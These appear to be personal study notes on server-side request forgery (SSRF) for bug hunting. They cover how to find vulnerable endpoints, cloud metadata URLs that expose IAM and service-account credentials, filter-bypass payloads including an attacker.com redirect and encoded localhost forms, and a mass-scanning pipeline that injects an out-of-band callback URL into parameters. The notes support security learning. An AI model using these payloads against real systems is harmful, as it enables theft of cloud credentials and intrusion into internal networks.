### what & why
> a vulnerability that lets an attacker send requests on behalf of a server, which allowing them to assume a privileged position on a network, bypass firewall controls, and gain access to internal services
### types
1. regular SSRF 
2. blind SSRF, the attacker does not receive feedback from the server via an HTTP response or an error message. can found via out-of-band DNS resolve request, or out-of-band HTTP request and then monitor your server logs, look for the server request headers
### Prevention
if the server does not make a distinction between internal and external resources this cuz the vulnerability, Two main types of protection against SSRFs exist: 
1. blocklists, The server will block a request if it contains a blocklisted address as input
2. allow-lists, The server will allow a request if url found in the allow-list
### hunt for it 
1. Spot Features Prone to SSRFs
	- SSRFs occur in features that require visiting and fetching external resources. These include webhooks, file uploads, document and image processors, link expansions or thumbnails, and proxy services.
		- Webhooks are custom HTTP callback endpoints used as a notification system for certain application events: such as new user sign-up or application error occurs
		- [H1 report](https://hackerone.com/reports/2301565)
	- any endpoint that processes a user-provided URL: imageURL,.. or any third-party software they may be using such as Jira
	- URLs embedded in files that are processed by the application (XML files and PDF files can often be used to trigger SSRFs)
	- hidden API endpoints that accept URLs as input, and input that gets inserted into HTML tags
	- test found open redirect
2. Provide Potentially Vulnerable Endpoints with Internal URLs
	- test how they handle local redirect by set up 302 response, or JS using pipdream, or NGrok. also u can sleep(1000) before the redirect
	- burp collaborator, intrach burp plug-in 
3. Check the Results for A service banner, errors
4. Since you cannot use blind SSRFs to read internal files or access internal services, u need to confirm it by explore internal network(Subnet scan), or port scan. and You can look especially for differences in response time and HTTP response codes, keep in mind may there are a firewall inplace.
5. Escalating the Attack
	1. scan the network for reachable hosts. find getway(10.0.0.1, 192.168.1.1) to locate the subnet 
	2. port-scan internal machines to fingerprint internal services. add port to payload url 
	3. collect instance metadata and get [[RCE]]
		Cloud computing services allow businesses to run their applications on other people’s servers, and offers an instance metadata tool that enables EC2 instances(VMs) to access data about themselves by querying the API endpoint at 169.254.169.254 `http://[::ffff:a9fe:a9fe]` IPv6 
		1. Querying EC2 Metadata: `http://169.254.169.254/latest/meta-data/`
			- http://169.254.169.254/latest/meta-data/ returns the list of available metadata that you can query.
			- http://169.254.169.254/latest/meta-data/local-hostname/ returns the internal hostname used by the host.
			- http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME returns the security credentials of that role.
			- http://169.254.169.254/latest/dynamic/instance-identity/document/ reveals the private IP address of the current instance.
			- http://169.254.169.254/latest/user-data/ returns user data on the current instance.
		1. Querying Google Cloud Metadata
		   Google implements additional security measures for its API endpoints, so querying Google Cloud Metadata APIv1 requires one of these special headers:
		   `Metadata-Flavor: Google`, `X-Google-Metadata-Request: True`
		   > bypass this protection, because most endpoints accessible through `APIv1` can be accessed via the `API v1beta1` endpoints instead. API v1beta1 is an older version of the metadata API that doesn’t have the same header requirements
			- http://metadata.google.internal/computeMetadata/v1beta1/instance/serviceaccounts/default/token returns the access token of the default account on the instance.
			- http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ ssh-keys ret
		1. DigitalOcean: http://169.254.169.254/metadata/v1/endpoint
		2. Kubernetes: https://kubernetes.default and https://kubernetes.default.svc/metrics
	1. bypass access controls may there are `admin.example.com`,APIs that only accessible throw intern connection
### bypass Protection
- Bypass Allowlists: by play with url => `https://pics.example.com@127.0.0.1` , `https://127.0.0.1/pics.example.com` , use a redirect function on `https://pics.example.com`
- Bypass Blocklists
	- Fooling It with Redirects: 
	  `https://public.example.com/proxy?url=https://attacker.com/ssrf`  where `attakcer.com` host `<?php header("location: http://127.0.0.1"); ?>`
	  - Using IPv6 Addresses: `::1` = localhost , `fc00::` is the first address on the private network.
	  - Tricking the Server with DNS: Modify the A/AAAA record of a domain you control and make it point to the internal addresses on the victim’s network. or just use online ones such: `hackingwithpentesterlab.link`, `spoofed.burpcollaborator.net`, `assets.pentesterlab.com.hackingwithpentesterlab.link`
	  - use alternative address: [http://0.0.0.0:1234], 
	  - Switching Out the Encoding
		  - 127.0.0.1 in decimal translates to `http://0x7f.0x0.0x0.0x1` in hex
		  - 127.0.0.1 translates to `http://0177.0.0.01` in octal
		  - 127.0.0.1 is the decimal representation of 01111111.00000000.00000000.00000001
		    When we translate the entire number, $(01111111000000000000000000000001)b$ = $(2130706433)dec$ so `https://2130706433` instead of `https://127.0.0.1`
	- URL-encoded: `https://localhost` => `https://%6c%6f%63%61%6c%68%6f%73%74` 
	- combined together `http://0177.0.0.0x1` , `http://127.0.1`, `http://127.1`

### automation
[SSRFmap](https://github.com/swisskyrepo/SSRFmap/),
```
Step 1: Subdomain Enumeration 
•DNS Dumpster •Sublist3r •Amass •Google Dorking •Certificate Transparency Logs •subdomainer
Step 2: Find Live Domains cat all-domains.txt | httpx > all-live.txt
Setp 2b: wayback machine: cat all-live.txt | python3 waymore.py | anew

Step 3: Identify All URLs cat all-live.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allUrls.txt

Step 4: Injection BurpCollaborator/Interactsh-Client URL in Parameters cat /home/casperino/tools/nuclei/httpx.txt | grep "=" | ./qsreplace http://40ga7gynfy6pcg06ov.oastify.com > ssrf.txt

  
Step 5: Test for SSRF Vulnerabilities cat ssrf.txt | httpx -fr

Step 6: How to check which URL is vulnerable split -l 10 ssrf.txt output_file_

```


other resources: file:///F:/Courses/02-cyber%20security/4-%20offensive%20security/PDFs/Offensive%20Security%20AWAE%20WEB-300%20OSWE.pdf page:437 a complete chapter(12) talked about how to exploit SSRF => port scanning, subnet scanning, mut more
